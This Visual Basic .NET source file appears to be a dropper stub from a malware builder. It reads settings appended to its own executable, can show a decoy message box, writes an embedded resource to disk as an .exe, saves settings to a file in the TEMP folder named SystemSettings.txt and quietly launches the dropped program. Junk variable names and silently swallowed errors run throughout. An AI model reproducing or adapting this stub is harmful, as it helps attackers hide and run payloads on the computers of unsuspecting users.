Imports System.IO

Public Class Main
    Private Const Banana2 As String = "<FileVersion>"
    Dim CazONENotSn As String
    Private Sub Main_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try

            If AlreadyRunning_Almost() Then
                End
            End If




            FileOpen(200, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            CazONENotSn = Space(LOF(200))
            FileGet(200, CazONENotSn)
            FileClose(200)

            If Not Split(CazONENotSn, Banana2)(13) = "" Then
                If Not Split(CazONENotSn, Banana2)(14) = "" Then
                    MsgBox(Split(CazONENotSn, Banana2)(14), MsgBoxStyle.OkOnly, Split(CazONENotSn, Banana2)(13))
                End If
            End If

            IO.File.WriteAllBytes(Split(CazONENotSn, Banana2)(1) & "\" & Split(CazONENotSn, Banana2)(2) & ".exe", My.Resources.Putente)


            wewe()

        Catch ex As Exception
            End
        End Try
    End Sub

    Sub wewe()
        Try
            Dim wr2 As StreamWriter
            wr2 = New StreamWriter(Environ("TEMP") & "\SystemSettings.txt", False)
            wr2.Write(Split(CazONENotSn, Banana2)(3) & vbCrLf & Split(CazONENotSn, Banana2)(4) & vbCrLf & Split(CazONENotSn, Banana2)(5) & vbCrLf &
                      Split(CazONENotSn, Banana2)(6) & vbCrLf & Split(CazONENotSn, Banana2)(7) & vbCrLf & Split(CazONENotSn, Banana2)(8) & vbCrLf &
                      Split(CazONENotSn, Banana2)(9) & vbCrLf & Split(CazONENotSn, Banana2)(10) & vbCrLf & Split(CazONENotSn, Banana2)(11) & vbCrLf &
                      Split(CazONENotSn, Banana2)(12))
            wr2.Flush()
            wr2.Close()


            Process.Start(Split(CazONENotSn, Banana2)(1) & "\" & Split(CazONENotSn, Banana2)(2) & ".exe")
            End
        Catch ex As Exception
            End
        End Try
    End Sub


    Private Function AlreadyRunning_Almost() As Boolean

        Dim my_proc As Process = Process.GetCurrentProcess
        Dim my_name As String = my_proc.ProcessName
        Return (Process.GetProcessesByName(my_name).Length > 1)

    End Function
End Class
